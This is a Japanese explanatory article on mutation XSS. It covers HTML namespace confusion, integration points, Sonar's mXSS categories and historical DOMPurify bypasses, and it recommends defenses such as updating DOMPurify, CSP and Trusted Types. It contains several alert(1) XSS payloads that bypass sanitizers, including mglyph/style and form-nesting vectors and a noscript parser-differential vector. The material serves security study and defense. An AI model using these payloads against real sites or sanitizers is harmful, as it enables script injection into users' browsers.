- **MathML text integration point**: `<mi>` `<mo>` `<mn>` `<ms>` `<mtext>` の5要素。これらの**中身**は、（一部の例外を除いて）HTMLとして解析される。つまりMathMLの海の中に空いた「HTMLの島」である。
- **HTML integration point**: SVGの `<foreignObject>` `<desc>` `<title>`、および MathMLの `<annotation-xml>`（ただし属性 `encoding` が `text/html` か `application/xhtml+xml` のとき）。これらの中身もHTMLとして解析される。`<foreignObject>`はまさに「SVGの中に非SVG（＝HTML）を埋め込むため」の要素だ。

まとめると、パーサの「現在の名前空間」は `<svg>`/`<math>` で外部へ切り替わり、integration point で再びHTMLへ戻る、というように**入れ子の親子関係に応じて刻々と変化**する。この「親が誰か」で子の名前空間が決まる、という点が後の攻撃で決定的になる。

#### mglyph と malignmark という特別な例外

ここが多くのDOMPurify mXSSの心臓部である。HTML仕様には次の特別ルールがある。

> **`<mglyph>` と `<malignmark>` は、MathML text integration point（`<mtext>`など）の「直接の子」である場合に限り、HTMLではなくMathML名前空間の要素として扱われる。**

言い換えると、`<mtext>`の中は基本HTMLの島なのに、`<mglyph>`と`<malignmark>`という2つのタグだけは「島の中の飛び地」で、MathML名前空間に留まるのである。この例外があるおかげで、攻撃者は次のような細工ができる。

- **1回目のパース**では、`<mglyph>` が `<mtext>` の直接の子に「ならない」ように、間に別の要素（例: `<table>`）を挟んでおく。すると `<mglyph>` はHTML名前空間となり、その下の `<style>` もHTML名前空間の raw text 要素になり、DOMPurifyには無害に見える。
- ところが**DOMPurifyが間の要素を削除**したり、パーサの自動補正でその要素が消えたりすると、**2回目のパース**では `<mglyph>` が `<mtext>` の直接の子に「なってしまい」、MathML名前空間へ移る。すると配下の `<style>` は raw text でなくなり、中に隠しておいた `<img onerror>` が本物の要素として復活する。

これが「**名前空間混同（namespace confusion）**」の典型パターンである。要素が置かれる名前空間が、サニタイズ前後で食い違うことを指す。

#### なぜ名前空間が「混同」されるのか

根本原因は、**DOMPurifyが検査した木の形と、再パース後の木の形が、パーサの自動補正・ノード削除・所有権規則によってズレる**ことにある。DOMPurifyは「今見えているノードの名前空間」を基準に安全性を判断するが、その判断はノードの親子関係に依存し、親子関係はサニタイズによって変わり得る。攻撃者は「サニタイズがこの木をこう変形させ、その結果この要素の名前空間がHTML→MathML（またはその逆）へ切り替わる」という一手先を読んで、変異を仕込むわけである。

---

### 背景となる先行研究: Michał Bentkowski の DOMPurify < 2.0.17 バイパス（2020年）

2本の担当資料はいずれも、Michał Bentkowski（securitum）の先行研究「Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass」を土台にしている。理解の前提として、まずこれを簡潔に押さえる。

Bentkowskiは、次の形のペイロードでDOMPurify **2.0.17未満**をバイパスした。

```html
<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
```

- **なぜ動くのか**: `<svg>`でSVG名前空間に入り、直後の `<p>`（SVGに存在しないHTML要素）によってパーサが名前空間の切り替え・要素の自動補正を行う。1回目のパースでは `<style>` の中身は解析されず、`<g>` の `title` 属性値が文字列 `</style><img src=x onerror=alert(1)>` として格納される。DOMPurifyは「titleという無害な属性を持つ`<g>`」しか見えないので通過させる。ところが**再シリアライズ→再パース**すると、属性値中の `</style>` が `<style>` を閉じ、`<img onerror>` が本物の要素として出現して発火する。属性値のシリアライズが `<` `>` `/` をエスケープしないという前述の性質が土台になっている。

Bentkowskiが提案し採用された対策は、「**要素が正しい名前空間に置かれているかを、親要素の名前空間と照合して検証する**」というもの（DOMPurifyの`_checkValidNamespace`に相当）。これは以後の名前空間混同を防ぐ堅牢な土台となった。ただし後述する2つの研究は、この防御の「隙間」を突いて再びバイパスに成功する。

> 出典: Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass -- https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/

---

### Gareth Heyes「Bypassing DOMPurify again with mutation XSS」（DOMPurify < 2.1 / 2020年10月7日）

#### 攻撃の着想: 「コメントを見落としたパッチ」

Bentkowskiのバイパス（前節）を受けてDOMPurifyは **2.0.17** で対策を入れた。この対策は、**テキストノードの中に潜在的な変異を引き起こしうる怪しいマークアップが潜んでいないか**を検査するものだった。しかしHeyesは決定的な見落としに気づく。Heyes自身の言葉を借りれば、パッチは「**テキストノード内の潜在的な変異は検査していたが、決定的なことに、コメントについては考慮していなかった（looked for potential mutation inside text nodes but crucially didn't take into account comments）**」のである。

foreign content（SVG/MathML）の内側では、コメント（`<!-- -->`）やCDATAセクション（`<![CDATA[ ]]>`）はHTMLとは異なる特殊な扱いを受ける。そこに変異の起爆装置を隠せば、DOMPurifyのテキスト走査をすり抜けられるというわけだ。「同じDOMPurifyをもう一度（again）破る」という論文タイトルはこの再挑戦を指す。

#### Chromeで動くペイロードと逐次解説

HeyesがChrome向けに示したペイロードは次のとおりである。

```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```

- **なぜ動くのか（ステップで追う）**:
  1. `<math>` でMathML名前空間へ。`<mtext>` はMathML text integration point（HTMLの島）。
  2. その中に `<table>` を挟むことで、続く `<mglyph>` は `<mtext>` の**直接の子ではなくなる**。前述の特別ルールにより、直接の子でない `<mglyph>` はMathMLの飛び地にならず**HTML名前空間**にとどまる。よって配下の `<style>` もHTML名前空間の raw text 要素となり、中身（コメントや`<img>`）は**ただのテキスト**として扱われ、DOMPurifyには無害に見える。
  3. さらに危険な `<img src=1 onerror=alert(1)>` を **HTMLコメント越しに、しかも `title` 属性の値の中に、`&gt;`/`&lt;`（`>`/`<`のHTMLエンティティ）でエンコードして**隠しておく。DOMPurifyの「テキストノード検査」はコメントの内側を見ないため、この起爆装置を検出できない。
  4. **サニタイズによって `<table>` が処理・除去される**と、再パース時に `<mglyph>` が `<mtext>` の直接の子に昇格し、**MathML名前空間へ変異**する。すると `<style>` はもはや raw text 要素ではなくなり、`</style>` で閉じられた後の内容やコメントの解釈が変わる。属性値に隠されていた `--&gt;` がコメントを終端させ、`&lt;img src=1 onerror=alert(1)&gt;` がデコードされて本物の `<img>` 要素として出現、`onerror` が発火する。

要するに「`<table>`という詰め物で `<mglyph>` の名前空間をHTML側に固定してDOMPurifyを油断させ、サニタイズで詰め物が消えることで名前空間をMathML側へ変異させ、コメントの陰に隠した`<img>`を復活させる」という三段構えである。

#### Firefoxで動くペイロード（CDATA版）

ブラウザによってforeign content内のコメント/CDATAの扱いが微妙に異なるため、HeyesはFirefox向けに **CDATAセクション** を使う変種も提示している。

```html
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

- **なぜ動くのか**: 骨格はChrome版と同一で、隠し場所がHTMLコメントから **CDATAセクション**（`<![CDATA[ ... ]]>`）に替わっている。Firefoxのforeign content解析ではCDATAが有効な特殊構文として処理されるため、`]]&gt;`（`]]>`のエンコード）でCDATAを終端させると、続く `&lt;/mglyph&gt;` と `&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;` がデコードされ、変異後の名前空間で本物の要素になる。

ここで注目すべきは `&Tab;` エンティティの使用である。`&Tab;` はタブ文字（U+0009）を表すHTMLエンティティだが、通常のスペースの代わりに属性区切りとして使える。変異によってこのエンティティがデコードされた後、パーサがタブ文字を属性間のセパレータとして認識し、`src=1` や `onerror=alert(1)` を `<img>` の独立した属性として正しく解析する。つまり **`&Tab;` がデコードされて属性区切りとして機能すること自体が、変異によって実際に新しいDOM要素が生成されたことの証拠**なのである。

#### Firefox代替ペイロード（コメント版）

Heyesは論文公開後のアップデートで、Firefox向けにCDATAではなくHTMLコメントを使う代替ペイロードも追加している。

```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

Chrome版と構造は似ているが、`title`属性値の中に `&lt;/mglyph&gt;` が追加されている点が異なる。変異後に `</mglyph>` がデコードされることで `<mglyph>` を明示的に閉じ、続く `<img>` がMathML名前空間から離脱してHTML要素として解析されるよう調整されている。ここでも `&Tab;` が属性区切りとして活用されている。

> 上記のペイロードで `&gt;`・`&lt;` を使うのは、DOMPurifyの1回目の検査時に「山括弧の生テキスト」として見えないようにするためである。エンティティは属性値の中では無害な文字列にすぎないが、名前空間が変異して`<style>`が要素解析される段になると、パーサがデコードして本物の山括弧として扱う。このタイミングのズレこそが変異XSSの本質だ。

#### 修正と教訓

Heyesが報告したこの一連のベクタは Cure53 によって **DOMPurify 2.1** で修正された（2020年）。教訓は明快だ。「テキストノードだけを検査しても、コメント・CDATAという"パーサ的な死角"に起爆装置を隠されると突破される」。サニタイザは、あらゆる文脈（コメント、CDATA、属性値、各名前空間）で一貫して安全でなければならない、ということである。

> 出典: Bypassing DOMPurify again with mutation XSS（Gareth Heyes, PortSwigger Research, 2020年10月7日公開） -- https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss

---

### Daniel Santos（@bananabr）による DOMPurify < 2.2.2 バイパス（2020年11月）

Heyesの修正（2.1）後、Daniel Santos（GitHub: @bananabr）は**新しい変異の引き金**を持ち込んで再びDOMPurifyを破った。この脆弱性はDOMPurifyのGitHub Issue #482として2020年11月2日に報告され、修正コミット `ee33fae`（"fix: Fixed a mXSS bypass reported in #482"）によって対処された。

#### ペイロードと名前空間の四段階横断

Santosが報告したペイロードは次のとおりである。

```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

このペイロードの最も際立った特徴は、**HTML → MathML → SVG → HTML** という4つの名前空間を横断する点にある。Heyesの攻撃がMathML内のコメント/CDATAを死角としたのに対し、Santosは**SVG名前空間混同（SVG namespace confusion）**を新たなガジェットとして導入した。

#### 変異の引き金: `<form>` 所有権変異ガジェット

HTML仕様には「**フォームは入れ子にできない**（a `<form>` cannot contain another `<form>`）」という制約がある。パーサは `<form>` の中でさらに `<form>` に出会うと、**2つ目の `<form>` を無視（ドロップ）**する。Santosはこの「2つ目のformが再パース時に消える」という挙動を、要素の**親を強制的に付け替える（＝所有権を変える）ガジェット**として利用した。

- **なぜ動くのか（ステップで追う）**:
  1. 1回目のパースでは、途中の `</form>` と2つ目の `<form>` があることで、`<mglyph>` は `<mtext>` の**直接の子にならない**構造として組まれる。よって `<mglyph>` はHTML名前空間にとどまる。
  2. `<mglyph>` の下に `<svg>` があり、そこから再びSVG名前空間へ入る。SVG内の `<mtext>` はMathMLではなくSVG要素として扱われ、その下の `<style>` はHTML名前空間の raw text 要素として機能する。危険な `<img onerror=alert(1)>` は `<path>` の `id` 属性値の中の文字列に過ぎず、DOMPurifyには無害に見える。
  3. しかし再パース時、**入れ子のformが許されず2つ目の`<form>`がドロップされる**ことで木の親子関係が変わり、`<mglyph>` が `<mtext>` の直接の子に昇格する。前述の特別ルールで**MathML名前空間へ変異**し、以降の名前空間の連鎖が崩れる。
  4. 名前空間の連鎖が崩れた結果、`<style>` は raw text 要素ではなくなり、`id` 属性値のシリアライズで露出した `</style>` が `<style>` を閉じ、続く `<img onerror=alert(1) src>` が本物の要素として出現して発火する。

「詰め物として何を使えば名前空間を変異させられるか」の答えが、Heyesの `<table>` から Santosの `<form>`（入れ子禁止という別の仕様）に替わった、と捉えると両者の連続性が見える。さらにSantosは `<svg>` を経由することで名前空間の横断回数を増やし、DOMPurify 2.1 で強化された検証の網の目をくぐり抜けている。

#### 修正と公開の時系列

Santosはこの脆弱性を **2020年11月2日**にCure53へ報告し（GitHub Issue #482）、修正コミット `ee33fae` によって対処された。修正では、名前空間検証の抜け穴（form所有権変異によって子の名前空間が事後的に変わるケース、およびSVGを経由した多段階の名前空間横断）を塞ぐよう、名前空間・親子関係のチェックが強化されている。

> 出典: GitHub Issue #482（Daniel Santos / @bananabr, 2020年11月2日） -- https://github.com/cure53/DOMPurify/issues/482 / 修正コミット `ee33fae` -- https://github.com/cure53/DOMPurify

---

### 実務者のためのまとめ: 攻撃の共通構造・防御・最新状況

#### 全バイパスに共通する「型」

ここまでの3研究（Bentkowski / Heyes / Santos）は、細部は違えど**同じ骨格**を共有している。攻撃者の思考モデルとして一般化すると次の4手順になる。

1. **危険な起爆装置を「無害な容れ物」に隠す**: `<style>`のraw text、属性値、コメント、CDATAなど、「1回目のパースでは要素にならない場所」に `onerror`/`onload` などを仕込む。
2. **名前空間を一時的にHTML側へ固定する詰め物を置く**: `<table>`、入れ子`<form>`、integration point要素（`foreignObject`/`annotation-xml`）などで、`<mglyph>`や`<style>`が「安全に見える名前空間」に留まるよう構造を作る。
3. **サニタイズが詰め物を消すことを見越す**: DOMPurifyが詰め物（table/2つ目のform/integration point要素）を除去・補正すると、親子関係が変わって名前空間が変異する。
4. **再パースで起爆装置が要素化して発火**: 名前空間変異により`<style>`が要素解析に切り替わり、隠していた`<img>`/`<iframe>`が本物の要素として蘇る。

#### 防御策

- **DOMPurifyを常に最新に保つ**: 本セクションのバイパスはいずれも既に修正済み（Bentkowski→2.0.17、Heyes→2.1、Santos→2.2.2、いずれも2020年）。これらの既知ベクタは最新版では成立しないが、**mXSSは構造的に新種が生まれ続ける**領域であり、バージョン追随が最重要。
- **サニタイズの結果を再びHTMLとして解釈させる経路を最小化する**: そもそも `innerHTML` などのHTML sinkへ流し込む回数を減らす。可能なら `textContent` で扱う、テンプレートエンジンの自動エスケープに任せる、など「2回目のパース」を発生させない設計にする。
- **CSP（Content Security Policy）による多層防御**: サニタイザ単独に依存せず、`script-src` の厳格化（`'unsafe-inline'` の排除、nonce/hash方式）や `require-trusted-types-for 'script'`（Trusted Types, DOM sinkへの生文字列代入を型で禁じる仕組み）を併用する。mXSSが万一成立しても、インラインスクリプトや`javascript:`の実行段でもう一段止められる。
- **設定の落とし穴に注意**: `ALLOWED_TAGS`/`ADD_TAGS` で `<style>`・`<svg>`・`<math>`・`foreignObject`・`annotation-xml` などを安易に許可すると、名前空間混同の素地を自ら作りかねない。必要最小限の許可リストにとどめる。

#### バージョン依存性についての注意（陳腐化に備えて）

本セクションのペイロードは、いずれも**特定バージョンでのみ有効な歴史的PoC**である（Bentkowski: DOMPurify < 2.0.17、Heyes: < 2.1、Santos: < 2.2.2。すべて2020年の事象）。現行のDOMPurifyでは通用しない。学ぶべきは個々の文字列そのものではなく、**「サニタイザが見た木」と「ブラウザが作る木」の不整合を、名前空間・integration point・所有権規則という仕様の隙間を使って作り出す**という**発想と原理**である。この原理を理解していれば、将来公開される新しいmXSS（別のガジェット、別のブラウザ差分）にも応用的に対処できる。

> 出典（横断的な確認に使用した情報源）:
> - DOMPurify 公式リポジトリおよび回帰テストフィクスチャ -- https://github.com/cure53/DOMPurify
> - Attack Classes & Bypass History（cure53/DOMPurify Wiki） -- https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
> - Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass（Michał Bentkowski, securitum） -- https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/

## mXSS解説とチートシート（Sonar）

このセクションでは、セキュリティ企業 Sonar（旧 SonarSource）が公開した2つの資料 ―― 解説記事「mXSS: The Vulnerability Hiding in Your Code」と、GitHub 上の「SonarSource/mxss-cheatsheet（mXSS チートシート）」―― を軸に、**mXSS（Mutation XSS、変異型クロスサイトスクリプティング）** を体系的に学びます。加えて、Sonar が発見した実在の脆弱性である **Joplin（CVE-2023-33726）** と **Mailspring（mXSS→RCE チェーン）** のケーススタディを通じて、mXSS が「アラートを出す遊び」ではなく **OS レベルの侵害に直結しうる脅威** であることを確認します。

反射型XSSのような「入力した文字列がそのまま実行される」タイプとは違い、mXSSは「サニタイズ（入力に含まれる危険な文字列を無害な形に変換・除去する処理）を通過した"安全に見える"文字列が、ブラウザによって再解釈される瞬間に危険なコードへ"変異（mutation）"する」という、より一段深い現象を扱います。ここが本セクション最大の学びどころです。

---

### mXSS（Mutation XSS）とは何か ―― 核心の一文

mXSS の核心は次の一文に集約されます。

> **サニタイザ（無害化処理）の目には「ただのテキスト（raw text）」として映る文字列を、ブラウザに渡した瞬間に「HTMLタグ」として解釈させる方法を見つけること。**

- **通常のXSS**: 攻撃者の `<script>` や `onerror=` が、フィルタの不備を"すり抜けて"そのまま出力される。
- **mXSS**: 攻撃文字列はサニタイズの段階では**確かに無害**である（サニタイザは正しく仕事をしている）。ところがその「無害化済みHTML文字列」を**ブラウザが描画のために再びパース（構文解析）し直す**とき、HTMLパーサの"癖"によって文字列の構造が組み替えられ（＝mutation／変異）、結果として `<img onerror=...>` のような実行可能な要素が出現してしまう。

つまり mXSS は「フィルタのバグ」ではなく、**"サニタイザが見たDOMツリー" と "ブラウザが最終的に構築したDOMツリー" が食い違う** という、パーサ（構文解析器）の仕様レベルの落とし穴を突きます。ここでいう **DOM（Document Object Model、HTMLをブラウザがツリー構造として保持したもの）** が、同じ入力文字列から2回作られるのに一致しない、という点が本質です。

Sonar の記事が強調する通り、**「マークアップへのいかなる小さな変更も、最終的なDOMツリーに大きな影響を与えうる（Any small change to the markup could have a major impact on the final DOM tree）」**。この事実が mXSS を強力かつ防御困難にしています。

#### 歴史的経緯（なぜ「mutation」と呼ぶのか）

- **2007年**: Yosuke Hasegawa（長谷川陽介）氏が、Internet Explorer で `innerHTML`（要素の中身をHTML文字列として読み書きするプロパティ）を読み戻すと文字列が"勝手に書き換わる"挙動を最初に報告。これが mXSS の原点とされます。
- **2013年**: Mario Heiderich らの論文 *"mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations"*（ACM CCS 2013）が、この現象を体系化し **mXSS** と名付けました。論文は、当時広く使われていたサーバサイドのサニタイザ（HTML Purifier, kses, htmlLawed, Google Caja 等）、クライアント側フィルタ（旧 IE XSS Filter、Chrome XSS Auditor）、WAF、IDS/IPS のいずれもが mXSS ベクタで回避されうることを示し、大きな衝撃を与えました。

> 出典: mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（Heiderich et al., ACM CCS 2013） — https://cure53.de/fp170.pdf

---

### Sonar の4分類 ―― mXSS パターンの体系化

Sonar の記事「mXSS: The Vulnerability Hiding in Your Code」は、mXSS を理解のために **4つのサブカテゴリ** に分割して整理しています。

#### 1. Parser Differentials（パーサ差分）

**サニタイザのパーサとブラウザのパーサの解釈が異なる**ことを突くパターンです。

最も有名な例が `<noscript>` 要素の挙動差です。`<noscript>` の中身がどう解釈されるかは、**JavaScript が有効か無効か（scripting フラグ）** によって変わります。

- サニタイザ内部で使われる `DOMParser` API はスクリプト無効とみなすため、`<noscript>` の中身を **raw text（ただのテキスト）** として扱う。
- 実ページではスクリプト有効なので、`<noscript>` の中身が **通常のHTMLとして解釈・実行される**。

```html
<noscript><style></noscript><img src=x onerror="alert(1)">
```

サニタイザは `</noscript>` までを `<noscript>` 内のテキストとみなし、`<img onerror>` もそのテキストの一部として無害と判断する。ところが実ページでは `<noscript>` の中身がHTMLとして解釈されるため、`<img onerror>` が本物の要素として出現し発火する。

#### 2. Parsing Round Trip（パース往復）

**HTMLをシリアライズ（文字列化）し、再びパースすると、異なるDOMツリーが生成される**パターンです。HTML仕様上、シリアライズ→再パースは冪等（べきとう＝何回やっても同じ結果になる性質）ではありません。

代表例はフォームの入れ子です。HTML仕様では `<form>` を入れ子にすることはできません。

```html
<form id="outer"><div></form><form id="inner"><input>
```

1回目のパースでは、2つ目の `<form>` は無視され、`<input>` は `outer` のフォームの子になります。しかしこのDOMをシリアライズして再パースすると、`</form>` で `outer` が閉じられた後に `inner` が有効な新しいフォームとして解釈され、**DOM構造が変わります**。

この性質を名前空間混同と組み合わせた高度なペイロードが以下です。

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

`<form>` の入れ子不可ルール、MathMLテキスト統合点（`<mtext>`）、`<mglyph>` の名前空間例外、`<style>` の raw text 解釈差を**直列に積み上げて**、サニタイザが見るDOMとブラウザが最終的に構築するDOMの間に最大の差分を作り出します。

#### 3. Desanitization（脱サニタイズ）

**サニタイズ後の処理が、無害化を台無しにする**パターンです。サニタイザ自体は正しく動作しているが、アプリケーションがサニタイズ済みHTMLに対して後から加工（要素の名前変更、属性の付け替え、文字列連結、別ライブラリへの再投入など）を行うことで、注入ベクタが復活します。

たとえば、サニタイズ後に SVG 要素の名前を変更すると、その要素の名前空間コンテキストが変わり、内部の `<style>` の解釈が raw text から通常のマークアップへ切り替わる ―― という形で変異が発生します。

このパターンで脆弱性が発見された実在のアプリケーションには、**osTicket**、**Mailspring**、**ProtonMail**、**Tutanota Desktop**、**Skiff Email** が含まれます。

#### 4. Context-Dependent Parsing（文脈依存パース）

**サニタイザがフラグメント（HTML断片）を解析する文脈と、アプリケーションが最終的にそのHTMLを埋め込む文脈が異なる**パターンです。

たとえばサニタイザは通常の HTML 文脈でフラグメントを解析しますが、アプリケーションがそのサニタイズ済みHTMLを SVG 名前空間の内部に挿入すると、`<style>` の解釈が変わり変異が発生します。ブラウザ間でもフラグメント解析の挙動に差異があり（後述のブラウザ差分を参照）、これも攻撃面を広げます。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### ブラウザ HTMLパーサの再解釈メカニズム（原理編）

mXSS を"暗記"ではなく"理解"するには、**なぜ再パースで構造が変わるのか**をパーサの仕組みで押さえる必要があります。以下、mXSS を生む主要なメカニズムを分解します。

#### HTML コンテンツの7つのパース分類

HTMLパーサは要素を7つのカテゴリに分類し、それぞれ異なるルールで中身を解釈します。

| カテゴリ | 該当する要素の例 | 中身の扱い |
|---|---|---|
| **Void 要素** | `img`, `input`, `br`, `hr`, `meta` | 中身を持てない（自己閉じ） |
| **Raw text 要素** | `script`, `style`, `iframe` | テキストのみ。エンティティもデコードしない |
| **Escapable raw text** | `textarea`, `title` | テキストのみだがエンティティはデコードする |
| **Foreign content** | `svg`, `math` | 別の名前空間のルールで解釈 |
| **Normal 要素** | `div`, `span`, `p` 等 | 通常のHTMLマークアップとして解釈 |

mXSS の核心は、**同じ要素（典型的には `<style>`）が、所属する名前空間によって上記のどのカテゴリに分類されるかが変わる** ことにあります。

#### 名前空間（namespace）の切り替え ―― HTML / SVG / MathML

HTMLパーサは、DOMツリーの各要素に **名前空間（namespace）** という属性を割り当てます。名前空間は3種類あります。

- **HTML 名前空間**（既定）
- **SVG 名前空間**（`<svg>` 以下）
- **MathML 名前空間**（`<math>` 以下）

SVG と MathML の中身は **foreign content（外来コンテンツ＝HTML以外の文法で解釈される領域）** として扱われ、**通常のHTMLとは異なるパースルールが適用されます**。

この差が最もはっきり出るのが `<style>` 要素の扱いです。

| 文脈 | `<style>` の中身の扱い | 子要素を持てるか |
|---|---|---|
| **HTML 名前空間** | raw text（テキストのみ） | 持てない |
| **foreign content（SVG/MathML内）** | 通常のHTMLとして解釈しうる | **子要素を持てる** |

HTML 名前空間では `<style>` 内に書かれた `<img onerror=...>` はただのテキストです。ところが SVG 名前空間内の `<style>` では同じ文字列が**本物のHTML要素**として解釈されます。

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

このペイロードでは、SVG 内の `<style>` がもはや raw text 要素ではないため、`</style>` が閉じタグとして機能し、続く `<img onerror>` が実行可能な要素として出現します。

#### インテグレーションポイント（integration points）

名前空間はどこでも自由に切り替わるわけではなく、**インテグレーションポイント（integration point、＝外来コンテンツの中に"HTMLの島"を作れる境界要素）** で HTML に戻れます。

**SVG の HTML integration points:**
- `<foreignObject>`, `<desc>`, `<title>`

**MathML の HTML integration points（テキスト統合点）:**
- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>`

**`<annotation-xml>`** は `encoding` 属性が `text/html` または `application/xhtml+xml` の場合にのみ HTML integration point として機能し、SVG を直接の子要素としてのみ埋め込めます。

#### `<mglyph>` と `<malignmark>` の罠

**`<mglyph>` と `<malignmark>`** は特殊な挙動を示します。MathML テキスト統合点（`<mi>`, `<mo>` 等）の**直接の子要素**である場合に限り、MathML 名前空間に留まります。他の要素は既定で HTML 名前空間になるのに対して例外的な挙動です。攻撃者は「HTML島の中にあるはずなのに、この2要素だけは MathML 側に引き戻される」という非対称性を使って、サニタイザの名前空間判定を欺きます。

#### `<image>` 要素の名前空間ブレーカー

SVG 名前空間内で `<image>` 要素が出現すると、ブラウザはこれを `<img>` に変換します。`<img>` は **foreign content breaker（外来コンテンツ脱出要素）** であるため、SVG 名前空間から HTML 名前空間へ強制的に切り替わります。

#### Foreign Content Breakers（外来コンテンツ脱出要素）一覧

以下の要素が foreign content（SVG/MathML）の中に出現すると、パーサは外来コンテンツを終了し HTML 名前空間に戻ります。

> `b`, `big`, `blockquote`, `body`, `br`, `center`, `code`, `dd`, `div`, `dl`, `dt`, `em`, `embed`, `h1`〜`h6`, `head`, `hr`, `i`, `img`, `li`, `listing`, `menu`, `meta`, `nobr`, `ol`, `p`, `pre`, `ruby`, `s`, `small`, `span`, `strong`, `strike`, `sub`, `sup`, `table`, `tt`, `u`, `ul`, `var`

これらの要素を意図的に foreign content 内に配置することで、名前空間の切り替えを制御し、サニタイザの予測と異なるDOMツリーを作り出すのが mXSS の常套手段です。

> 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/

---

### SonarSource mXSS チートシート ―― 要素ごとの予期しない挙動

SonarSource の mXSS チートシート（`sonarsource.github.io/mxss-cheatsheet`）は、「ブラウザのHTMLパース時の癖が引き起こす mutation を深掘りするためのワンストップ資料」として、要素ごとの予期しない挙動を網羅的に整理しています。

#### HTML 名前空間の要素

**Select:**
`<select>` 内に許可されない要素が出現すると、パーサはその要素を**削除**します。

```
入力:  <select><a>text</a></select>
結果:  <select>text</select>     ← <a> が消える
```

**Form（入れ子不可）:**
`<form>` は入れ子にできません。ただし `<div>` で分断すると2つ目のフォームが有効になる場合があります。

```
入力:  <form id="outer"><div></form><form id="inner"><input>
結果:  （再パース時に inner が有効なフォームとして出現）
```

**Table（foster parenting／里子出し）:**
テーブル内に許可されない要素が出現すると、パーサはその要素を**テーブルの直前へ移動**させます。

```
入力:  <table><a>text</a></table>
結果:  <a>text</a><table></table>     ← <a> がテーブルの外へ追い出される
```

**Anchor（入れ子不可）:**
`<a>` 要素同士は入れ子にできません。Active Formatting Elements の再構築アルゴリズムにより構造が変わります。

**Headings（見出しの入れ子）:**
見出し要素は入れ子にすると分割されます。

```
入力:  <h1><h2>text</h2></h1>
結果:  <h1></h1><h2>text</h2>
```

**Noscript:**
前述の通り、JavaScript の有効/無効で中身の解釈が完全に変わります。サニタイザでは最も危険な要素の一つです。

**`<br>` と `<p>`:**
HTML仕様上、終了タグだけで要素を生成できる唯一の要素群です。

```
入力:  </p>
結果:  <p></p>     ← 終了タグだけで要素が生まれる
```

**Plaintext:**
`<plaintext>` はHTMLで閉じることができません。一度開くと文書末尾まですべてがテキストとして扱われます。

**Textarea:**
`<textarea>` の中身はデコードされます（RCDATA要素）。HTMLコメント `<!-- -->` は `<textarea>` 内では解釈されません。

**Active Formatting Elements:**
以下の要素は「Active Formatting Elements」として特別な再構築アルゴリズムの対象になります。

> `a`, `b`, `big`, `code`, `em`, `font`, `i`, `nobr`, `s`, `small`, `strike`, `strong`, `tt`, `u`

これらの要素が閉じられずに残った場合、パーサは暗黙的にこれらを再適用するため、予期しないDOM構造が生まれます。

**NULL バイト:**
HTMLパーサは NULL バイト（`\x00`）を **U+FFFD（REPLACEMENT CHARACTER、文字コード 65533）** に変換します。

#### SVG 名前空間の要素

**HTML Integration Points:**
`<foreignObject>`, `<desc>`, `<title>` の内部では HTML 名前空間に戻り、通常のHTMLとして解釈されます。

**`<image>` 要素:**
SVG内では `<image>` は許可されていますが、ブラウザは内部でこれを `<img>` に変換します。`<img>` は foreign content breaker であるため、SVG 名前空間から脱出するトリガーになります。

#### MathML 名前空間の要素

**HTML Integration Points（テキスト統合点）:**
`<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` の内部では HTML 名前空間に戻ります。

**`<annotation-xml>`:**
SVG を埋め込めるのは**直接の子要素**としてのみです。

**`<mglyph>` / `<malignmark>`:**
HTML integration point の直接の子要素である場合に限り、MathML 名前空間に留まります（他の要素は HTML 名前空間になるのに対して例外）。

#### ブラウザ間の差異

同じHTMLでもブラウザによってDOMツリーの構築結果が異なるケースがあります。

```
入力:  <svg><div>text</div></svg>
```

| ブラウザ | 結果 |
|---|---|
| **Firefox** | `<svg><div>text</div></svg>` （`<div>` が SVG 内に留まる） |
| **Chrome / Safari 等** | `<svg></svg><div>text</div>` （`<div>` が SVG の外へ出る） |

この差異は、あるブラウザでは安全なペイロードが別のブラウザでは実行可能になりうることを意味し、サーバサイドのサニタイザにとって構造的な脅威です。

> 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/
> 出典: mXSS Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/

---

### 代表的なペイロード集

以下は、Sonar の記事・チートシートおよび権威ある研究から再現した代表的 mXSS ペイロードです。各ペイロードには **「なぜ動くのか」** を必ず添えます。

#### 例1: 古典 ―― `<listing>` / エンティティ・デコード（IE時代の原点）

```html
<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
```

- **なぜ動くのか**: 当時の IE は `<listing>`（古い整形済みテキスト要素）の `innerHTML` を読み戻すときにエンティティを `<`/`>` へデコードしてしまい、返り値が `<img src=1 onerror=alert(1)>` という本物のタグに変異した。文字列を再取得・再挿入するコードがあると、この変異した本物のタグが実行される。mXSS の"原点"となった挙動。

> 出典: mXSS Attacks（Heiderich et al., 2013） — https://cure53.de/fp170.pdf

#### 例2: `<noscript>` × scripting フラグ（Parser Differential）

```html
<noscript><style></noscript><img src=x onerror="alert(1)">
```

